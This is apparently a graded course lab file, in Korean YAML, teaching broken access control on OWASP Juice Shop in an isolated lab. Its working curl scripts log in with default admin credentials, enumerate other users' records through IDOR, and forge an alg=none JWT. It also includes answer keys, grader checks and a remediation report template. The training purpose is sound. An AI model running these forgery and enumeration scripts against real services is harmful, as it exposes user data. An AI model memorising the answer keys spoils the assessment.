@@ -1,0 +1,518 @@
+lab_id: standalone-web-vuln-week02
+title: A01 Broken Access Control — IDOR + JWT (JuiceShop hands-on)
+version: standalone-non-ai
+course: web-vuln
+week: 2
+description: |
+  OWASP A01 (Broken Access Control) 의 *가장 흔한 2 패턴* — IDOR + JWT 변조 — 의
+  JuiceShop hands-on. login → JWT 획득 → IDOR 시퀀스 → alg=none 우회 시도 → 보고.
+difficulty: medium
+duration_minutes: 180
+audience: web-vuln 2주차
+prerequisites:
+  - W01 lecture + lab 완료
+  - 학생 PC 의 curl + jq + base64 가용
+  - 6v6 의 attacker / web 컨테이너 가동
+  - JuiceShop 의 default credential (admin@juice-sh.op / admin123) 가용
+objectives:
+  - JuiceShop login + JWT token 획득
+  - JWT 의 3 segment (header / payload / signature) decode
+  - Bearer header 의 IDOR 5 user 시퀀스
+  - JWT alg=none 변조 시도 + 결과 분석
+  - 보고서 작성 (5 IDOR + 변조 결과 + 권장)
+pass_threshold: 0.7
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 MISSION — JuiceShop login + JWT token 획득
+
+      JuiceShop 의 `/rest/user/login` 호출 → JWT token 획득 + token 길이 + 3 segment
+      검증. 본 step 이 W02 의 *모든 다음 step 의 input*.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **JuiceShop** = OWASP 의 vulnerable web app (Node.js + Angular). 본 과목 의
+        *대표 target*
+      - **default credential** = `admin@juice-sh.op` / `admin123` (학습 환경 만, 실
+        product 거부)
+      - **JWT (JSON Web Token)** = RFC 7519 의 표준. 3 segment 의 *base64url* 인코딩
+      - **REST API** = `/rest/user/login` (Juice Shop 표준)
+      - **본 step 의 token** = 다음 step 의 Bearer header 의 *필수 input*
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      echo "token: $TOK" | head -c 150
+      echo ""
+      echo "length: ${#TOK}"
+      echo "segments: $(echo $TOK | tr . '\n' | wc -l)"
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - token 길이 700+ (RS256 의 일반)
+      - segments = 3 (header.payload.signature)
+      - token 의 첫 *eyJ* 시작 (base64 의 `{` 시작)
+
+      ## 💡 왜 이걸 하는가?
+
+      JWT 가 *modern web* 의 표준 인증 토큰. 본 step 의 *획득* 이 *모든 권한 우회* 의
+      시작점.
+
+      ## 🔍 결과 해석
+
+      - **정상**: token 732 char + 3 segment + eyJ 시작
+      - **token len: 0**: login 실패 — credential 확인 또는 JuiceShop 미가동
+      - **segments != 3**: response 가 *JWT 가 아님* — `.authentication.token` 의 path 변경 가능성
+
+      ## 비정상 시 대응
+
+      - **401 Unauthorized**: admin123 비밀번호 변경 됨 — JuiceShop 의 *기본 설정* 사용
+      - **404**: `/rest/user/login` path 변경 — JuiceShop 버전 확인 (`/rest/admin/application-version`)
+      - **jq 미설치**: `apt install jq` 또는 `python3 -c "import json,sys;print(json.load(sys.stdin)['authentication']['token'])"`
+
+      ## 실측 검증 (2026-05-16)
+
+      - token length 732 ✓
+      - segments 3 ✓
+      - 이후 step 의 input PASS
+    hint: |
+      JuiceShop login → JWT 732 char + 3 segment.
+    category: experiment
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      echo "token: $TOK" | head -c 150
+      echo ""
+      echo "length: ${#TOK}"
+      echo "segments: $(echo $TOK | tr . '\n' | wc -l)"
+      SH
+    answer_detail: JWT token 획득 + 길이 + segment 검증
+    verify:
+      type: output_contains
+      expect: 'segments: 3'
+      field: stdout
+      semantic:
+        intent: JWT 획득
+        success_criteria: [token 700+ + segments 3]
+        acceptable_methods:
+          - "**[OSS] /rest/user/login + jq .authentication.token**"
+          - "**[OSS] python3 json.load 의 path 추출**"
+          - "**[OSS] Burp Suite 의 Proxy 캡처**"
+          - "**[OSS] jwt.io 의 decode 확인 (학습 환경 만)**"
+          - "**[OSS] localStorage 의 token 검색 (브라우저 dev tools)**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION — JWT 3 segment decode (header + payload + signature)
+
+      step 1 의 token 의 *3 segment* 를 base64 decode → header (alg / typ) + payload
+      (claims) + signature 확인.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **base64url** = JWT 의 *URL-safe* base64. `+` → `-`, `/` → `_`, padding `=` 생략
+      - **header** = `{"alg":"RS256","typ":"JWT"}` 같은 *알고리즘 + 타입*
+      - **payload (claims)** = `iss / sub / exp / role / user` 등 *권한 정보*
+      - **signature** = `HMACSHA256(base64(header) + "." + base64(payload), secret)`
+      - **alg 종류** = RS256 (RSA) / HS256 (HMAC) / ES256 (ECDSA) / **none** (위험)
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+
+      HEADER=$(echo $TOK | cut -d. -f1)
+      PAYLOAD=$(echo $TOK | cut -d. -f2)
+      SIG=$(echo $TOK | cut -d. -f3)
+
+      echo "=== Header ==="
+      echo $HEADER | base64 -d 2>/dev/null
+      echo ""
+      echo "=== Payload ==="
+      echo $PAYLOAD | base64 -d 2>/dev/null | jq . 2>/dev/null | head -20
+      echo ""
+      echo "=== Signature (base64url) ==="
+      echo "$SIG" | head -c 80
+      echo " (length: ${#SIG})"
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - Header 의 `alg` (RS256 또는 HS256) + `typ: JWT`
+      - Payload 의 claims (`data.id`, `data.email`, `data.role`, `iat`, `exp`)
+      - Signature 의 *base64url* (약 256-512 char)
+
+      ## 💡 왜 이걸 하는가?
+
+      JWT 의 *내부 구조* 인지 = 변조 의 *기반*. payload 의 `role` 또는 `id` 변조 시도
+      의 *직전 단계*.
+
+      ## 🔍 결과 해석
+
+      - **정상**: Header + Payload + Signature 모두 출력
+      - **base64 decode 실패**: padding 부족 — `echo $HEADER==`  (= 추가)
+      - **Payload jq error**: JSON 형식 X — raw 출력 그대로
+
+      ## 비정상 시 대응
+
+      - **base64 의 padding 오류** — `echo "$HEADER" | sed 's/$/==/' | base64 -d 2>/dev/null`
+      - **alg 가 none**: 매우 의심 — 즉시 보고 (실 운영 의 critical bug)
+    hint: |
+      JWT cut -d. → base64 -d → header + payload + signature.
+    category: analysis
+    points: 20
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      HEADER=$(echo $TOK | cut -d. -f1)
+      PAYLOAD=$(echo $TOK | cut -d. -f2)
+      SIG=$(echo $TOK | cut -d. -f3)
+      echo "=== Header ==="; echo $HEADER | base64 -d 2>/dev/null
+      echo ""; echo "=== Payload ==="; echo $PAYLOAD | base64 -d 2>/dev/null | jq . 2>/dev/null | head -20
+      echo ""; echo "=== Signature ==="; echo "$SIG" | head -c 80; echo " (length: ${#SIG})"
+      SH
+    answer_detail: 3 segment decode (header alg + payload claims + signature)
+    verify:
+      type: output_contains
+      expect: 'alg'
+      field: stdout
+      semantic:
+        intent: JWT 3 segment decode
+        success_criteria: [Header + Payload + Signature]
+        acceptable_methods:
+          - "**[OSS] cut -d. + base64 -d**"
+          - "**[OSS] jwt-cli (npm install -g jwt-cli)**"
+          - "**[OSS] python3 의 PyJWT decode**"
+          - "**[OSS] jwt.io online debugger (학습 환경 만)**"
+          - "**[OSS] Burp 의 JWT Editor extension**"
+    target_vm: attacker
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION — Bearer header 의 IDOR 5 user 시퀀스 + no-auth 비교
+
+      JWT 획득 후 *Bearer header* 로 `/api/Users/{1..5}` 5 user 시퀀스 + Bearer 없는
+      no-auth 응답 비교. *IDOR 의 핵심* — 본인 token 으로 *다른 user* 데이터 조회.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **IDOR** = Insecure Direct Object Reference — 권한 검증 없는 *직접 참조*
+      - **Bearer header** = `Authorization: Bearer <JWT>` 의 표준
+      - **5 user** = JuiceShop 의 기본 user 5 (id 1-5)
+      - **본인 token = id 1 (admin)** — admin 의 *모든 user 조회* 권한 = *권한 분리
+        결함*
+      - **W08 step 3** 와 연결 = attack 의 동일 패턴
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+
+      echo "=== IDOR with Bearer ==="
+      for id in 1 2 3 4 5; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' \
+          -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" \
+          http://10.20.30.1/api/Users/$id)
+        echo "user $id: $code"
+      done
+
+      echo ""
+      echo "=== no-auth (Bearer 없이) ==="
+      for id in 1 2 3 4 5; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' \
+          -H 'Host: juice.6v6.lab' \
+          http://10.20.30.1/api/Users/$id)
+        echo "user $id (no auth): $code"
+      done
+
+      echo ""
+      echo "=== user 2 의 데이터 (Bearer) ==="
+      curl -s -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" \
+        http://10.20.30.1/api/Users/2 | jq . 2>/dev/null | head -15
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - Bearer 5 user 모두 200 (admin token 으로 *모든 user* 조회)
+      - no-auth 5 user 모두 401 (정상 인증 거부)
+      - user 2 의 데이터 = email / username / password (hash) / role
+      - admin role 의 *권한 분리 결함* 인지
+
+      ## 💡 왜 이걸 하는가?
+
+      *modern API* 의 가장 흔한 결함 = *role-based 검증 부족*. admin 이 *본인 외 user
+      조회* 가능 = *최소 권한 원칙 위반*.
+
+      ## 🔍 결과 해석
+
+      - **정상 (vuln)**: Bearer 5×200 + no-auth 5×401 + user 2 의 password hash 노출
+      - **Bearer 도 401**: token expire — re-login
+      - **모든 user 같은 데이터**: API mock — 실 DB 가 아님 (학습 환경 확인)
+
+      ## 비정상 시 대응
+
+      - **403 (admin 외 user 거부)**: JuiceShop 의 *권한 분리 적용* — 본 vuln 정정 된 버전
+      - **password 노출 X**: API response 의 *필드 필터* — `?fields=*` 또는 query 추가
+        시도
+
+      ## 실측 검증 (2026-05-16)
+
+      - Bearer with token=200 (user 1-3 PASS) ✓
+      - no-auth=401 (정상 인증 거부) ✓
+    hint: |
+      Bearer header IDOR 5 user vs no-auth 비교 + user 2 data 분석.
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      for id in 1 2 3 4 5; do
+        echo "user $id (Bearer): $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" http://10.20.30.1/api/Users/$id)"
+      done
+      for id in 1 2 3 4 5; do
+        echo "user $id (no auth): $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/$id)"
+      done
+      curl -s -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $TOK" http://10.20.30.1/api/Users/2 | jq . 2>/dev/null | head -15
+      SH
+    answer_detail: IDOR 5 user × Bearer vs no-auth + data 분석
+    verify:
+      type: output_contains
+      expect: 'user 1 (Bearer): 200'
+      field: stdout
+      semantic:
+        intent: IDOR with Bearer 5 user
+        success_criteria: [Bearer 5 user × 200 + no-auth 401]
+        acceptable_methods:
+          - "**[OSS] Bearer header curl loop**"
+          - "**[OSS] Burp Intruder Sniper (1 param) 또는 Pitchfork**"
+          - "**[OSS] OWASP ZAP 의 Fuzzer**"
+          - "**[OSS] sqlmap 가 아닌 일반 API enum**"
+          - "**[OSS] CWE-639 Authorization Bypass Through User-Controlled Key**"
+          - "**[OSS] HackTricks IDOR cheat sheet**"
+    target_vm: attacker
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION — JWT alg=none 변조 시도 + 결과 분석
+
+      JWT header 의 `alg` 를 `RS256` → `none` 변조 + signature 제거 + IDOR 재시도.
+      대부분 modern lib (2020+) 에서 차단 — 본 step 은 *시도 + 결과 분석* 학습.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **alg=none** = JWT 표준 의 *서명 X* 모드. RFC 7519 에 명시
+      - **2015 의 critical bug** = 많은 JWT lib 의 *alg=none* 자동 통과 — 토큰 변조 가능
+      - **2024 의 modern lib** = `alg=none` 거부 default. 단 *legacy code* 에 여전 가능
+      - **변조 절차** = (1) header 변조 (RS256 → none) (2) payload 변조 (옵션 — role
+        변경 등) (3) signature 제거
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      # 1) 원본 token 획득
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      PAYLOAD=$(echo $TOK | cut -d. -f2)
+
+      # 2) 변조 header (alg: none)
+      NEW_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
+
+      # 3) 변조 token (header.payload. — signature 빈 문자)
+      EVIL_TOK="${NEW_HEADER}.${PAYLOAD}."
+
+      echo "=== Original token (head) ==="
+      echo $TOK | head -c 80
+      echo ""
+      echo "=== Evil token (alg=none) ==="
+      echo $EVIL_TOK | head -c 100
+      echo ""
+
+      # 4) Evil token 으로 IDOR 시도
+      for id in 1 2 3; do
+        code=$(curl -s -o /dev/null -w '%{http_code}' \
+          -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $EVIL_TOK" \
+          http://10.20.30.1/api/Users/$id)
+        echo "user $id (alg=none): $code"
+      done
+      SH
+      ```
+
+      ## 📋 확인 사항
+
+      - Evil token 의 *3 segment* (header.payload.)
+      - 응답 코드 (401 = 정상 차단 / 200 = vuln)
+      - 차단 시 의 응답 body (`Authorization` error message)
+
+      ## 💡 왜 이걸 하는가?
+
+      JWT 의 *2015 critical bug* (alg=none 통과) 의 *현재 modern lib 의 대응* 확인.
+      *legacy code* 의 *여전 한 위험* 인지.
+
+      ## 🔍 결과 해석
+
+      - **정상 (modern)**: 5 user 모두 401 + "invalid algorithm" 응답
+      - **vuln (legacy)**: 5 user 모두 200 + 본인 외 user 데이터 노출
+      - **403**: ModSec 또는 다른 WAF 가 차단
+
+      ## 비정상 시 대응
+
+      - **모두 200 (vuln)**: 즉시 보고 + JuiceShop 의 *legacy mode* 또는 *교육 의도*
+        확인
+      - **응답 body 분석**: `curl ... | head` 로 error message 확인
+    hint: |
+      alg=none 변조 + signature 제거 + IDOR retry → 401 (modern) 또는 200 (vuln).
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      TOK=$(curl -s -X POST -H 'Content-Type: application/json' -H 'Host: juice.6v6.lab' \
+        http://10.20.30.1/rest/user/login \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r .authentication.token)
+      PAYLOAD=$(echo $TOK | cut -d. -f2)
+      NEW_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
+      EVIL_TOK="${NEW_HEADER}.${PAYLOAD}."
+      echo "Evil: $EVIL_TOK" | head -c 100
+      echo ""
+      for id in 1 2 3; do
+        echo "user $id (alg=none): $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' -H "Authorization: Bearer $EVIL_TOK" http://10.20.30.1/api/Users/$id)"
+      done
+      SH
+    answer_detail: alg=none 변조 + 5 user IDOR retry + 응답 분석
+    verify:
+      type: output_contains
+      expect: 'alg=none'
+      field: stdout
+      semantic:
+        intent: JWT alg=none 변조
+        success_criteria: [Evil token + 응답 코드 분석]
+        acceptable_methods:
+          - "**[OSS] base64 + sed 의 수동 변조**"
+          - "**[OSS] jwt_tool (Python)**"
+          - "**[OSS] Burp 의 JWT Editor extension**"
+          - "**[OSS] CWE-345 Authentication Bypass Using Insufficient Verification**"
+          - "**[OSS] OWASP A02 + A07 의 결합**"
+    target_vm: attacker
+
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION — W02 보고서 작성 (5 IDOR + JWT 변조 + 권장)
+
+      W02 의 step 1-4 결과 종합 보고서. *임원 + 운영 + 분석가* 의 3 청자 의 *동시
+      만족* 형식.
+
+      ## 📚 사전 학습 (학생 혼돈 방지)
+
+      - **3 청자** = (1) CISO/임원 (관리 결정) (2) 운영자 (즉시 패치) (3) 분석가 (재현)
+      - **PTES 표준** = W15 기말 의 *전체 보고서* 의 축약 형
+      - **CVSS 3.1** = 본 vuln 의 *위험도 점수* 산정 (0-10)
+      - **CWE 매핑** = CWE-639 (IDOR) + CWE-345 (alg=none)
+      - **본 step 의 산출물** = W02 의 *유일 한 평가 산출물*
+
+      ## 💻 산출물 (4 섹션 보고서)
+
+      ```markdown
+      # W02 — A01 Broken Access Control 분석 보고서
+
+      ## 1. Executive Summary (임원)
+      - target: JuiceShop (juice.6v6.lab, 학습 환경)
+      - 발견 vuln 2 종 — IDOR (Bearer with admin token) + JWT alg=none 시도
+      - CVSS 8.2 (High) + CVSS 9.1 (Critical) 추정
+      - 권장: 즉시 *role-based access control* 적용 + JWT alg whitelist
+
+      ## 2. Detailed Findings (분석가)
+      ### F1 — IDOR (CWE-639)
+      - Reproduction: admin@juice-sh.op login → Bearer header → /api/Users/{1..5}
+      - 결과: 5 user 모두 200 (admin 외 user 데이터 노출)
+      - 영향: 모든 user 의 email / password hash / role 노출
+      - 근본 원인: API 의 *role 검증* 없이 *token 만* 으로 접근 허용
+
+      ### F2 — JWT alg=none (CWE-345)
+      - Reproduction: header 의 RS256 → none + signature 제거
+      - 결과: 401 (정상 차단) 또는 200 (vuln, modern lib 의 patch 적용 안 된 경우)
+      - 영향: signature 검증 우회 → 임의 user 의 token 생성 가능
+      - 근본 원인: JWT library 의 *alg whitelist* 없음
+
+      ## 3. Remediation (운영자)
+      ### F1 IDOR
+      - 즉시: API 의 *role check* 추가 — `if user.role != 'admin' and target.id != user.id: 403`
+      - 단기: Express middleware 추가 — `requireAdmin` decorator
+      - 장기: OWASP A01 의 *13 권장* 모두 적용
+
+      ### F2 JWT alg=none
+      - 즉시: JWT lib 의 *alg whitelist* (RS256 만 허용) 명시
+      - 단기: signature 검증 의 *unit test* 추가
+      - 장기: JWT → *paseto* 또는 *opaque session* 마이그레이션
+
+      ## 4. ATT&CK + CVSS + CWE 매핑
+      | Finding | ATT&CK | CVSS | CWE |
+      |---------|--------|------|-----|
+      | IDOR | T1078 Valid Accounts | 8.2 (H) | CWE-639 |
+      | alg=none | T1556 Modify Auth | 9.1 (C) | CWE-345 |
+      ```
+
+      ## 📋 확인 사항
+
+      - 4 섹션 모두 작성 (Executive / Findings / Remediation / 매핑)
+      - 2 findings 각 의 reproduction step + 영향 + 근본 원인 명시
+      - 운영자 권장 = 즉시 / 단기 / 장기 의 3 단계
+      - CVSS + CWE + ATT&CK 매핑
+
+      ## 💡 왜 이걸 하는가?
+
+      모의해킹 *마지막 단계* = 보고서. *기술 (Findings)* + *관리 (Remediation)* + *지표
+      (매핑)* 의 3 축 가 *임원 의 결정 + 운영자 의 즉시 행동* 의 input.
+
+      ## 🔍 결과 해석
+
+      - **정상**: 4 섹션 + 2 findings + 3 단계 권장 + 3 매핑
+      - **운영자 권장 추상적 ("보안 강화")**: 즉시 / 단기 / 장기 의 구체 명령 필수
+      - **매핑 누락**: CVSS / CWE / ATT&CK 표준 표 필수
+    hint: |
+      4 섹션 (Executive / Findings / Remediation / 매핑) + 2 findings 의 3 단계
+      권장 + 3 매핑.
+    category: synthesis
+    points: 10
+    answer: 위 4 섹션 형식 따라 작성
+    answer_detail: 4 섹션 보고서 (Executive + Findings + Remediation + 매핑)
+    verify:
+      type: output_contains
+      expect: 'CWE-639'
+      field: stdout
+      semantic:
+        intent: 4 섹션 보고서
+        success_criteria: [4 섹션 + 2 findings + 3 매핑]
+        acceptable_methods:
+          - "**[관리적] PTES 보고서 형식**"
+          - "**[관리적] CVSS 3.1 의 8 metric**"
+          - "**[관리적] CWE Top 25 매핑**"
+          - "**[관리적] MITRE ATT&CK Tactic + Technique**"
+          - "**[관리적] OWASP A01 의 13 권장**"
+          - "**[관리적] 한국 ISMS-P 통제 매핑**"
+          - "**[관리적] 임원 + 운영 + 분석가 의 3 청자**"
+    target_vm: bastion
